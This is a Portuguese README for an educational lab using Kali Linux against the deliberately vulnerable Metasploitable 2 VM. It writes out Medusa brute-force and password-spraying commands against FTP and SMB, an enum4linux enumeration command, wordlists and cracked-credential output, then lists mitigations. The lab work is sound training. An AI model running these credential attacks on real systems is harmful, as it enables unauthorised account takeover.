# Simulação de Ataques de Força Bruta com Kali Linux e Medusa

## Descrição

Este projeto apresenta a implementação de um laboratório prático de cibersegurança utilizando Kali Linux e Metasploitable 2 para simular ataques de força bruta e enumeração de usuários em um ambiente controlado.

O objetivo principal foi compreender, na prática, o funcionamento de técnicas ofensivas utilizadas contra serviços vulneráveis, bem como analisar riscos relacionados a senhas fracas e más configurações de autenticação.

Todos os testes foram realizados exclusivamente para fins educacionais.

---

# Tecnologias e Ferramentas Utilizadas

- Kali Linux
- Metasploitable 2
- VirtualBox
- Medusa
- enum4linux
- FTP
- SMB

---

# Estrutura do Laboratório

| Máquina | Função |
|---|---|
| Kali Linux | Máquina atacante |
| Metasploitable 2 | Máquina vulnerável |

### Configuração de Rede
- Host-Only Adapter

---

# Cenários Executados

## 1. Ataque de Força Bruta em FTP

Foi utilizado o Medusa para automatizar tentativas de login contra o serviço FTP do Metasploitable 2.

### Wordlists utilizadas

#### Usuários
```bash
echo -e 'user\nmsfadmin\nadmin\nroot' > users.txtSenhas
echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt
Comando executado
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
Resultado
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
2. Enumeração SMB

Foi utilizada a ferramenta enum4linux para identificar:

usuários do sistema;
compartilhamentos SMB;
políticas de senha;
informações do servidor Samba.
Comando executado
enum4linux -a 192.168.56.101 | tee enum4_output.txt
3. Password Spraying em SMB

Após a enumeração de usuários, foi realizado um ataque de password spraying utilizando o Medusa.

Wordlists utilizadas
Usuários
echo -e 'user\nmsfadmin\nservice' > smb_users.txt
Senhas
echo -e 'password\n123456\nWelcome123\nmsfadmin' > senhas_spray.txt
Comando executado
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
Resultado
ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
Resultados Obtidos

Os testes demonstraram:

uso de senhas fracas;
reutilização de credenciais;
ausência de políticas de complexidade;
falta de bloqueio após múltiplas tentativas;
exposição de serviços vulneráveis.
Medidas de Mitigação
Utilização de senhas fortes;
Implementação de MFA;
Bloqueio após tentativas falhadas;
Monitoramento de logs;
Uso de SFTP no lugar de FTP;
Atualização de serviços vulneráveis;
Segmentação de rede.
Observações

O cenário envolvendo DVWA não foi executado porque o acesso ao servidor web foi bloqueado pela rede utilizada no ambiente de testes.

Aviso Legal

Este projeto foi desenvolvido exclusivamente para fins educacionais e de aprendizado em segurança da informação. Não utilize estas técnicas em sistemas sem autorização.
